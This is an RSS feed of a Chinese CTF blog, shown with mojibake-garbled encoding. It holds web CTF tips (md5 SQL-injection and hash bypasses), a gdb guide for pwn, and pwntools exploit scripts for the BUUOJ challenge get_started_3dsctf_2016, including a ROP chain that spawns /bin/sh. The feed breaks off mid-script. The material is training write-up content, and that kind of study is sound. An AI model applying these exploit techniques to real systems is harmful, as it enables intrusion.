<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>ç»å‰‘é˜</title>
    <link>https://cjliblog.top/</link>
    
    <image>
      <url>https://www.gravatar.com/avatar/9a30667a06f9e54b4502c81e69456aa3</url>
      <title>ç»å‰‘é˜</title>
      <link>https://cjliblog.top/</link>
    </image>
    
    <atom:link href="https://cjliblog.top/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>é“¶å±ä¹‹ä¸‹ï¼Œé¾™æ¸¸å››æµ·ã€‚</description>
    <pubDate>Fri, 08 Sep 2023 09:48:44 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>CTF webé›†</title>
      <link>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/</link>
      <guid>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/</guid>
      <pubDate>Wed, 30 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<ol><li><a href="https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">å‘½ä»¤æ³¨å…¥</a></li></ol><p>æ¥è‡ª<a href="https://uuzdaisuki.com/"> <strong>Leticiaâ€™s Blog</strong> </a></p><ol start="2"><li><p>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€åæœ‰ .git .<a href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020">svn</a> .swp .~ .bak .bash_history</p></li><li><p>ffifdyopç»è¿‡md5å’Œfrom hexè½¬åŒ–ä¹‹åä¼šç”Ÿæˆâ€™orâ€™6å¼€å¤´çš„å­—ç¬¦ä¸²</p></li><li><p>ä¸¤ä¸ªmd5å“ˆå¸Œå¯ä»¥0eå¼€å¤´è‹¥ç›¸ç­‰</p></li><li><p>ä¸¤ä¸ªmd5å¼ºç›¸ç­‰æ¡ä»¶å¯ä»¥ç”¨æ•°åˆ—ç»•è¿‡å»</p></li><li></li></ol><h2 id="buuojå¥½é¢˜åå•"><a href="#buuojå¥½é¢˜åå•" class="headerlink" title="buuojå¥½é¢˜åå•"></a>buuojå¥½é¢˜åå•</h2><p>1.[GXYCTF2019]Ping Ping Ping</p><p>æ¨èç†ç”±ï¼šå‘½ä»¤æ³¨å…¥</p><p>å»ºè®®ï¼š</p><p>   1.å°è¯•base64ç»•è¿‡å’Œæ‹¼æ¥ç»•è¿‡</p><p>   2.chromeå¼€å¤´åŠ ä¸Šâ€view-source:â€œï¼Œå¯ä»¥çœ‹å…¨æºç ï¼ˆç›¸å½“äºctrl+uï¼‰</p><p>2.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1</p><p>æ¨èç†ç”±ï¼šsqlæ³¨å…¥</p><p>å»ºè®®ï¼šçœ‹æ”»ç•¥ <a href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a></p><p>3.ã€RoarCTF 2019ã€‘Easy Calc 1</p><p>æ¨èç†ç”±ï¼šè§£é‡Šåˆ°ä½</p><p>å»ºè®®ï¼šçœ‹æ”»ç•¥<a href="https://www.dccomics.top/2021/11/11/%E3%80%90RoarCTF%202019%E3%80%91Easy%20Calc%201/">https://www.dccomics.top/2021/11/11/%E3%80%90RoarCTF%202019%E3%80%91Easy%20Calc%201/</a></p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFåšé¢˜è®°å½•</category>
      
      
      <comments>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnå°çŸ¥è¯†</title>
      <link>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86%EF%BC%88%E7%BD%AE%E9%A1%B6%EF%BC%89/</link>
      <guid>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86%EF%BC%88%E7%BD%AE%E9%A1%B6%EF%BC%89/</guid>
      <pubDate>Wed, 30 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="pwn-gdbæ“ä½œ"><a href="#pwn-gdbæ“ä½œ" class="headerlink" title="pwn-gdbæ“ä½œ"></a>pwn-gdbæ“ä½œ</h2><p>åœ¨PWNä¸­ä½¿ç”¨GDB (GNU Debugger) è¿›è¡Œè°ƒè¯•æ˜¯ä¸€ä¸ªå¸¸è§çš„æ–¹æ³•ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨GDBè°ƒè¯•äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¸€èˆ¬æ­¥éª¤å’Œä¸€äº›æœ‰ç”¨çš„æŠ€å·§ï¼š</p><ol><li><p><strong>å¯åŠ¨GDB</strong>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ./binary_name</span><br></pre></td></tr></table></figure></li><li><p><strong>è®¾ç½®æ–­ç‚¹</strong>:<br>ä½¿ç”¨ <code>b</code> (æˆ– <code>break</code>) å‘½ä»¤è®¾ç½®æ–­ç‚¹ã€‚ä¾‹å¦‚ï¼Œä¸ºä¸»å‡½æ•°è®¾ç½®æ–­ç‚¹:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b main</span><br></pre></td></tr></table></figure></li><li><p><strong>è¿è¡Œç¨‹åº</strong>:<br>ä½¿ç”¨ <code>r</code> (æˆ– <code>run</code>) å‘½ä»¤:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r [program arguments]</span><br></pre></td></tr></table></figure></li><li><p><strong>æŸ¥çœ‹å¯„å­˜å™¨çŠ¶æ€</strong>:<br>ä½¿ç”¨ <code>info registers</code> æˆ–ç®€å†™ <code>i r</code>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i r</span><br></pre></td></tr></table></figure></li><li><p><strong>å•æ­¥æ‰§è¡Œ</strong>:</p><ul><li><code>s</code> æˆ– <code>step</code>: æ‰§è¡Œä¸€è¡Œæºä»£ç ã€‚å¦‚æœè¯¥è¡Œæ˜¯å‡½æ•°è°ƒç”¨ï¼Œåˆ™è¿›å…¥è¯¥å‡½æ•°ã€‚</li><li><code>n</code> æˆ– <code>next</code>: æ‰§è¡Œä¸€è¡Œæºä»£ç ã€‚ä¸ä¼šè¿›å…¥å‡½æ•°ã€‚</li></ul></li><li><p><strong>æŸ¥çœ‹å†…å­˜</strong>:</p><ul><li><code>x</code> å‘½ä»¤: ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å¯ä»¥æŸ¥çœ‹æŸä¸ªåœ°å€çš„å†…å®¹ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x/10x <span class="variable">$rsp</span>  <span class="comment"># æŸ¥çœ‹å †æ ˆé¡¶éƒ¨çš„10ä¸ªåå…­è¿›åˆ¶å€¼</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ç»§ç»­æ‰§è¡Œ</strong>:<br>ä½¿ç”¨ <code>c</code> (æˆ– <code>continue</code>) å‘½ä»¤ã€‚</p></li><li><p><strong>é€€å‡ºGDB</strong>:<br>ä½¿ç”¨ <code>q</code> (æˆ– <code>quit</code>) å‘½ä»¤ã€‚</p></li><li><p><strong>ä½¿ç”¨GDBæ’ä»¶</strong>:<br>ä¸ºäº†æ–¹ä¾¿PWNè°ƒè¯•ï¼Œç¤¾åŒºæœ‰å¾ˆå¤šæœ‰ç”¨çš„GDBæ’ä»¶ï¼Œä¾‹å¦‚ <code>pwndbg</code>, <code>PEDA</code> å’Œ <code>GEF</code>ã€‚è¿™äº›æ’ä»¶ä¸ºGDBæä¾›äº†é¢å¤–çš„åŠŸèƒ½å’Œè§†è§‰å¢å¼ºï¼Œä½¿å…¶æ›´å®¹æ˜“ç”¨äºæ¼æ´åˆ†æå’Œåˆ©ç”¨ã€‚</p></li><li><p><strong>è°ƒè¯•è¿œç¨‹ç¨‹åº</strong>:<br>  å¦‚æœä½ æ­£åœ¨å°è¯•åˆ©ç”¨è¿œç¨‹æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ <code>gdbserver</code> åœ¨è¿œç¨‹ç«¯å¯åŠ¨ç¨‹åºï¼Œå¹¶ä»æœ¬åœ°ä½¿ç”¨GDBè¿æ¥å®ƒè¿›è¡Œè°ƒè¯•ã€‚</p></li><li><p><strong>å…¶ä»–æœ‰ç”¨çš„å‘½ä»¤</strong>:</p></li></ol><ul><li><code>info proc mappings</code>: æ˜¾ç¤ºè¿›ç¨‹çš„å†…å­˜æ˜ å°„ã€‚</li><li><code>set follow-fork-mode child</code>: å½“ç¨‹åºè¿›è¡Œforkæ—¶ï¼ŒGDBä¼šè·Ÿè¸ªå­è¿›ç¨‹ã€‚</li><li><code>set disassembly-flavor intel</code>: å°†åæ±‡ç¼–æ ¼å¼è®¾ç½®ä¸ºIntelæ ¼å¼ï¼Œè¿™é€šå¸¸æ¯”é»˜è®¤çš„AT&amp;Tæ ¼å¼æ›´æ˜“äºé˜…è¯»ã€‚</li></ul><p>è¿™åªæ˜¯ä½¿ç”¨GDBè¿›è¡ŒPWNè°ƒè¯•çš„åŸºç¡€ã€‚ä¸ºäº†æˆåŠŸåœ°æ‰¾åˆ°å¹¶åˆ©ç”¨æ¼æ´ï¼Œå¯èƒ½è¿˜éœ€è¦æŒæ¡æ›´å¤šé«˜çº§çš„è°ƒè¯•å’Œé€†å‘æŠ€å·§ã€‚</p><h2 id="æ ˆçš„å°çŸ¥è¯†"><a href="#æ ˆçš„å°çŸ¥è¯†" class="headerlink" title="æ ˆçš„å°çŸ¥è¯†"></a>æ ˆçš„å°çŸ¥è¯†</h2><h3 id="æ ˆ-Stack-æ˜¯å•¥ï¼Ÿ"><a href="#æ ˆ-Stack-æ˜¯å•¥ï¼Ÿ" class="headerlink" title="æ ˆ(Stack)æ˜¯å•¥ï¼Ÿ"></a>æ ˆ(Stack)æ˜¯å•¥ï¼Ÿ</h3><p>æ ˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„çº¿æ€§æ•°æ®ç»“æ„ï¼Œå®ƒåªå…è®¸åœ¨ä¸€ç«¯ï¼ˆç§°ä¸ºâ€œé¡¶â€ï¼‰è¿›è¡Œæ’å…¥å’Œåˆ é™¤æ“ä½œã€‚ç”±äºå®ƒçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨â€œåè¿›å…ˆå‡ºâ€ï¼ˆLIFOï¼‰æ¥æè¿°å®ƒã€‚å°±åƒä¸€å ç›˜å­ï¼Œæˆ‘ä»¬åªèƒ½æ”¾åœ¨æœ€é¡¶ç«¯æˆ–ä»æœ€é¡¶ç«¯æ‹¿èµ°ã€‚ğŸ½ï¸</p><p>ä½†æ˜¯æ ˆåœ¨å®é™…ç»“æ„é‡Œæ˜¯â€œå€’ç€çš„â€ï¼Œä¹Ÿå°±æ˜¯é«˜ä½åœ°å€æ‰æ˜¯åº•éƒ¨ï¼Œä½ä½åœ°å€æ‰æ˜¯é¡¶éƒ¨ï¼Œå€¼å¾—æ³¨æ„ã€‚</p><h3 id="æ ˆçš„ä¸»è¦æ“ä½œ"><a href="#æ ˆçš„ä¸»è¦æ“ä½œ" class="headerlink" title="æ ˆçš„ä¸»è¦æ“ä½œ"></a>æ ˆçš„ä¸»è¦æ“ä½œ</h3><ul><li><strong>å‹æ ˆ(Push)</strong>: å‘æ ˆä¸­æ·»åŠ å…ƒç´ ã€‚</li><li><strong>å¼¹æ ˆ(Pop)</strong>: ä»æ ˆä¸­å–å‡ºå…ƒç´ ã€‚</li></ul><h3 id="ä¸ºå•¥è¦ç”¨æ ˆå‘¢ï¼ŸğŸ¤”"><a href="#ä¸ºå•¥è¦ç”¨æ ˆå‘¢ï¼ŸğŸ¤”" class="headerlink" title="ä¸ºå•¥è¦ç”¨æ ˆå‘¢ï¼ŸğŸ¤”"></a>ä¸ºå•¥è¦ç”¨æ ˆå‘¢ï¼ŸğŸ¤”</h3><ol><li><strong>å‡½æ•°è°ƒç”¨</strong>ï¼šå½“å‡½æ•°Aè°ƒç”¨å‡½æ•°Bæ—¶ï¼Œå‡½æ•°Açš„çŠ¶æ€ï¼ˆä¾‹å¦‚å±€éƒ¨å˜é‡ï¼‰è¢«â€œå‹å…¥â€æ ˆä¸­ï¼Œç­‰å¾…å‡½æ•°Bå®Œæˆåå†ç»§ç»­æ‰§è¡Œã€‚</li><li><strong>æ‹¬å·åŒ¹é…</strong>ï¼šä½ çŸ¥é“ç¼–ç¨‹ä¸­çš„æ‹¬å·æ˜¯å¦é…å¯¹æ­£ç¡®å—ï¼Ÿç”¨æ ˆå°±èƒ½è½»æ¾æå®šï¼</li><li><strong>æ’¤é”€æ“ä½œ</strong>ï¼šä¾‹å¦‚åœ¨æ–‡å­—å¤„ç†è½¯ä»¶ä¸­ï¼Œæ’¤é”€åŠŸèƒ½å°±é æ ˆå®ç°ã€‚</li></ol><h3 id="æ ˆçš„ç¾ä¸­ä¸è¶³ï¼šğŸŒ¹ä¸ğŸŒªï¸"><a href="#æ ˆçš„ç¾ä¸­ä¸è¶³ï¼šğŸŒ¹ä¸ğŸŒªï¸" class="headerlink" title="æ ˆçš„ç¾ä¸­ä¸è¶³ï¼šğŸŒ¹ä¸ğŸŒªï¸"></a>æ ˆçš„ç¾ä¸­ä¸è¶³ï¼šğŸŒ¹ä¸ğŸŒªï¸</h3><ul><li>ğŸŒ¹<strong>ä¼˜ç‚¹</strong>ï¼šç»“æ„ç®€å•ï¼Œæ“ä½œçµæ´»ã€‚</li><li>ğŸŒªï¸<strong>ç¼ºç‚¹</strong>ï¼šå­˜å‚¨ç©ºé—´å—é™ï¼Œå®¹æ˜“é€ æˆæº¢å‡ºã€‚</li></ul><h3 id="ä¸¾ä¸ªä¾‹å­"><a href="#ä¸¾ä¸ªä¾‹å­" class="headerlink" title="ä¸¾ä¸ªä¾‹å­"></a>ä¸¾ä¸ªä¾‹å­</h3><p>æœ‰ä¸€æ®µROPé“¾è¢«å‘é€åˆ°32ä½linuxï¼Œå®ƒå…¶ä¸­çš„å†…å®¹æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop_3_ret)<span class="comment"># mprotectæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œ32ä½æ ˆå‡½æ•°ä¼ å‚</span></span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)     <span class="comment"># 0x7 == å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">payload += p32(start_addr)</span><br></pre></td></tr></table></figure><p>åˆ™æ ˆçš„ç»“æ„å˜æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- è¢«æ”»å‡»å‡½æ•°è¿”å›åæ‰§è¡Œæ­¤åœ°å€</span><br><span class="line">+--------------+</span><br><span class="line">|  0x100       | &lt;-- readå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° (size)</span><br><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° (buf)</span><br><span class="line">+--------------+</span><br><span class="line">|  0           | &lt;-- readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° (file descriptor, 0ä»£è¡¨stdin)</span><br><span class="line">+--------------+</span><br><span class="line">|  pop_3_ret   | &lt;-- ç”¨äºpopä¸‰ä¸ªå‚æ•°åˆ°å¯„å­˜å™¨</span><br><span class="line">+--------------+</span><br><span class="line">|  read_addr   | &lt;-- readå‡½æ•°åœ°å€</span><br><span class="line">+--------------+</span><br><span class="line">|  0x7         | &lt;-- mprotectå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° (æƒé™: å¯è¯»å¯å†™å¯æ‰§è¡Œ)</span><br><span class="line">+--------------+</span><br><span class="line">|  0x1000      | &lt;-- mprotectå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° (å¤§å°)</span><br><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- mprotectå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° (åœ°å€)</span><br><span class="line">+--------------+</span><br><span class="line">|  pop_3_ret   | &lt;-- ç”¨äºpopä¸‰ä¸ªå‚æ•°åˆ°å¯„å­˜å™¨</span><br><span class="line">+--------------+</span><br><span class="line">| mprotect_addr| &lt;-- mprotectå‡½æ•°åœ°å€ï¼Œï¼ˆåŸæ¥ä¸ºebpï¼‰</span><br><span class="line">+--------------+</span><br><span class="line">|    ...       | &lt;-- 0x38ä¸ª&#x27;cyclic&#x27;å­—ç¬¦ï¼Œå¯èƒ½ç”¨äºæº¢å‡ºç¼“å†²åŒº</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯æ¬¡ä»æœ€ä½ä½POPä¸€ä¸ªæ–¹å—ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„è¦æ±‚ï¼Œæ¯”å¦‚æ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€read_addrçš„è¯ï¼Œå°±è¦å†è¿ç»­POPå®ƒæ‰€è¦æ±‚çš„å‚æ•°ï¼Œreadæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥POPä¸‰ä¸ªå‚æ•°ã€‚ç„¶åreadæ˜¯è¦è¯»å–ç”¨æˆ·è¾“å…¥çš„å†…å®¹çš„ï¼Œå› æ­¤è¿˜è¦ç­‰ç”¨æˆ·è¾“å…¥å†…å®¹ã€‚è¾“å…¥å®Œä¹‹åï¼Œå‡½æ•°ä¸€èˆ¬éƒ½ä¼šæœ‰ä¸€ä¸ªreturnï¼Œè¿™é‡Œå°±æ˜¯å›åˆ°start_addrã€‚è€ŒåŸé¢˜shellcodeåœ¨readè¿‡ç¨‹ä¸­å†™å…¥äº†æ­¤åœ°å€ï¼Œå› æ­¤å¯ç›´æ¥è¿›å…¥shellã€‚</p><p>åŸé¢˜æ˜¯pwnåˆ·é¢˜è®°å½•2ä¸­çš„get_started_3dsctf_2016ï¼ˆ*ï¼‰</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFåšé¢˜è®°å½•</category>
      
      
      <comments>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86%EF%BC%88%E7%BD%AE%E9%A1%B6%EF%BC%89/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwné¢˜è§£é›† 2ï¼ˆæŒç»­æ›´æ–°ä¸­ï¼‰</title>
      <link>https://cjliblog.top/2023/08/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%202%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</link>
      <guid>https://cjliblog.top/2023/08/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%202%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</guid>
      <pubDate>Fri, 25 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="get-started-3dsctf-2016ï¼ˆ-ï¼‰"><a href="#get-started-3dsctf-2016ï¼ˆ-ï¼‰" class="headerlink" title="get_started_3dsctf_2016ï¼ˆ*ï¼‰"></a>get_started_3dsctf_2016ï¼ˆ*ï¼‰</h2><p><em>9.2ï¼Œ9.3</em></p><p><strong>éš¾é¢˜çœŸå¤šï¼Œå…ˆåšä¸ªç®€å•çš„ï¼ˆç„¶åå‘ç°è¿˜æ˜¯å¥½éš¾ï¼ï¼ï¼ä½†æ˜¯æ–¹æ³•æ˜¯çœŸçš„å¤šï¼Œå¯æ˜“å¯éš¾ï¼Œå¥½é¢˜ï¼ï¼‰</strong></p><p>åˆ†æï¼š</p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æœ‰NXï¼Œi386ï¼Œ32ä½</p><h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#å¯ä»¥åé¦ˆdebugçš„ä¸€å¥æ“ä½œï¼ŒæŒºå®æƒ çš„[doge]</span></span><br><span class="line">q=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29728</span>)</span><br><span class="line"></span><br><span class="line">get_flag=<span class="number">0x080489A0</span></span><br><span class="line"><span class="comment">#è¿™æ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€</span></span><br><span class="line">exit=<span class="number">0x0804E6A0</span></span><br><span class="line"><span class="comment">#è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œè¿™é‡Œç”¨äºè¿œç¨‹æ­£å¸¸é€€å‡º</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>) + p32(get_flag) + p32(exit)</span><br><span class="line"><span class="comment">#å¡«å…¥åƒåœ¾æ•°å­—åˆ°ebpï¼Œè½¬åˆ°å‡½æ•°ï¼Œæ‰§è¡Œå®Œåæ­£å¸¸exitï¼ˆå¦åˆ™ä¼šå‡ºç°timeoutï¼Œ</span></span><br><span class="line"><span class="comment">#å¯èƒ½æ˜¯å› ä¸ºget_flagå‡½æ•°æ²¡æœ‰returnï¼‰</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="number">0x308CD64F</span>   </span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line"><span class="comment">#IDAä¸­å¯æŸ¥ï¼Œå°±æ˜¯è¦æ±‚çš„æ•°å­—çš„0xè¡¨ç¤ºåŠæ³•</span></span><br><span class="line"></span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line"><span class="comment">#è¿›å…¥get_flagæ˜¯ä¼šè°ƒç”¨ä¸¤ä¸ªå‚æ•°çš„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¡è¿›å»çš„åˆšå¥½æ˜¯a1å’Œa2</span></span><br><span class="line"></span><br><span class="line">q.sendline(payload)</span><br><span class="line">re=q.recvline()</span><br><span class="line"><span class="built_in">print</span>(re)</span><br><span class="line"><span class="comment">#å‘é€ï¼Œæ¥æ”¶ï¼Œæ‰“å°ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;../get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29252</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸€ä¸ªç®€æ˜“çš„æœ¬åœ°è¿œç¨‹è°ƒè¯•åˆ‡æ¢å™¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ¥ä¸‹æ¥åˆ©ç”¨ROPgadgetå’ŒIDAè¿›è¡Œgadgetä»¥åŠä¸€äº›åœ°å€çš„è·å–</span></span><br><span class="line">pop_eax_ret = <span class="number">0x80b91e6</span></span><br><span class="line"><span class="comment">#ROPgadget --binary &lt;æ–‡ä»¶&gt; --only &#x27;pop|ret&#x27;|grep eax</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x806fc30</span></span><br><span class="line"><span class="comment">#ROPgadget --binary &lt;æ–‡ä»¶&gt; --only &#x27;pop|ret&#x27;|grep edx</span></span><br><span class="line"></span><br><span class="line">int80 = <span class="number">0x806d7e5</span></span><br><span class="line"><span class="comment">#è¿™æ˜¯32ä½çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼Œæœç´¢æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="comment">#ROPgadget --binary &lt;æ–‡ä»¶&gt; --only int</span></span><br><span class="line">mov_edx_eax_ret = <span class="number">0x80557ab</span></span><br><span class="line"><span class="comment">#åŒç†</span></span><br><span class="line"></span><br><span class="line">haha=<span class="number">0x80ea000</span></span><br><span class="line"><span class="comment">#ä¸€ä¸ªå¯å†™åœ°å€ï¼Œç”¨æ¥å­˜ä¹‹åå†™å…¥çš„/bin/shï¼ŒæŸ¥æ‰¾åŠæ³•è¯¦è§åæ€1</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(pop_eax_ret)+<span class="string">b&#x27;/bin&#x27;</span>+p32(pop_edx_ecx_ebx_ret)+p32(haha)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(mov_edx_eax_ret)</span><br><span class="line"><span class="comment">#ç”¨åƒåœ¾å¡«åˆ°ebpï¼ŒæŠŠ/binå­˜åˆ°eaxï¼Œedxå­˜hahaï¼Œecxå­˜0ï¼Œebxå­˜0ï¼Œeaxçš„å€¼èµ‹ç»™edx</span></span><br><span class="line"><span class="comment">#ä¸»è¦æ€æƒ³æ˜¯eaxé‡Œå­˜å…¥&#x27;/bin&#x27;å­˜åˆ°edxé‡Œhahaçš„åœ°å€ï¼Œecxå’Œebxèµ‹å€¼å¤šå°‘æ— æ‰€è°“</span></span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_ret)+<span class="string">b&#x27;/sh\x00&#x27;</span>+p32(pop_edx_ecx_ebx_ret)+p32(haha+<span class="number">4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(mov_edx_eax_ret)</span><br><span class="line"><span class="comment">#åŒç†çš„ã€‚32ä½çš„è¯æ˜¯4å­—èŠ‚ï¼Œå› æ­¤/bin/sh\x00æ˜¯åˆ†ä¸¤æ®µå­˜ã€‚è€Œè¿™é‡Œå­˜åˆ°/binçš„åå››ä½ï¼Œæ‹¼æ¥èµ·æ¥ã€‚</span></span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(haha)+p32(int80)</span><br><span class="line"><span class="comment">#å®ç°ç³»ç»Ÿè°ƒç”¨&#x27;execve(&quot;/bin/sh&quot;, NULL, NULL) &#x27;è¯¦è§32ä½ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œexecveåºå·ä¸º0xbï¼Œä¸‰ä¸ªå‚æ•°</span></span><br><span class="line"><span class="comment">#è€Œ32ä¸ºç¨‹åºé€šè¿‡ int 80 æ“ä½œè¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œç”± eax å¯„å­˜å™¨ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼Œ</span></span><br><span class="line"><span class="comment">#ä¼ å‚é¡ºåºä¾æ¬¡ä¸ºebx ï¼Œ ecx ï¼Œ edx ï¼Œ esi ï¼Œ edi ï¼Œ ebp ï¼Œè¿”å›å€¼å­˜åœ¨ eax ä¸­</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸‰ï¼š"><a href="#æ–¹æ³•ä¸‰ï¼š" class="headerlink" title="æ–¹æ³•ä¸‰ï¼š"></a>æ–¹æ³•ä¸‰ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(os=&quot;linux&quot;, 